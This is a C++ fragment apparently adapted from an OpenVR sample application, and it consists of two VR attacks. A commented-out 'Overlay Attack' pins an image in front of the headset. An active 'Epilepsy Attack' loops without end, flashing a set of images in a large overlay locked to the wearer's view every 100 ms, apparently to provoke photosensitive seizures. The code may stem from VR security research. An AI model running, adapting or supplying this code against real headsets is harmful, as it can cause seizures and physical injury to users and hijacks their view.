...
bool CMainApplication::BInit()
{
	...
	*/
	...
	/*
	// Overlay Attack
	const char* img_path = "C:\\Users\\AlexVR\\source\\repos\\openvr\\samples\\hellovr_opengl\\Capture.PNG";
	while (1) {
		vr::EVRInitError eError = vr::VRInitError_None;
		m_pHMD = vr::VR_Init(&eError, vr::VRApplication_Overlay);
		vr::VROverlayHandle_t oHandle;
		vr::VROverlay()->CreateOverlay("Overlay", "Overlay", &oHandle);
		vr::HmdMatrix34_t current_pos;
		vr::VRChaperoneSetup()->GetWorkingStandingZeroPoseToRawTrackingPose(&current_pos);
		current_pos.m[2][3] = -1;
		vr::VROverlay()->SetOverlayTransformTrackedDeviceRelative(oHandle, vr::k_unTrackedDeviceIndex_Hmd, &current_pos);
		vr::VROverlay()->SetOverlayFromFile(oHandle, img_path);
	...
	*/
	...
	// Epilepsy Attack
	char* img_path;
	char* epilepsy[] = { "C:\\Users\\AlexVR\\source\\repos\\openvr\\samples\\hellovr_opengl\\epilepsy\\e1.jpg",
					     "C:\\Users\\AlexVR\\source\\repos\\openvr\\samples\\hellovr_opengl\\epilepsy\\e2.jpg", 
					     "C:\\Users\\AlexVR\\source\\repos\\openvr\\samples\\hellovr_opengl\\epilepsy\\e3.jpg" };
	int i = 0;
	int num_images = *(&epilepsy + 1) - epilepsy;
	while (true) {
		img_path = epilepsy[i];
		vr::EVRInitError eError = vr::VRInitError_None;
		m_pHMD = vr::VR_Init(&eError, vr::VRApplication_Overlay);
		vr::VROverlayHandle_t oHandle;
		vr::VROverlay()->CreateOverlay("Epilepsy", "Epilepsy", &oHandle);
		vr::HmdMatrix34_t current_pos;
		vr::VRChaperoneSetup()->GetWorkingStandingZeroPoseToRawTrackingPose(&current_pos);
		current_pos.m[2][3] = -1;
		vr::VROverlay()->SetOverlayTransformTrackedDeviceRelative(oHandle, vr::k_unTrackedDeviceIndex_Hmd, &current_pos);
		vr::VROverlay()->SetOverlayFromFile(oHandle, (const char*)img_path);
		vr::VROverlay()->SetOverlayWidthInMeters(oHandle, 3);
		vr::VROverlay()->ShowOverlay(oHandle);
		Sleep(100);
		vr::VROverlay()->HideOverlay(oHandle);
		i++;
		if (i == num_images) i = 0;
	}
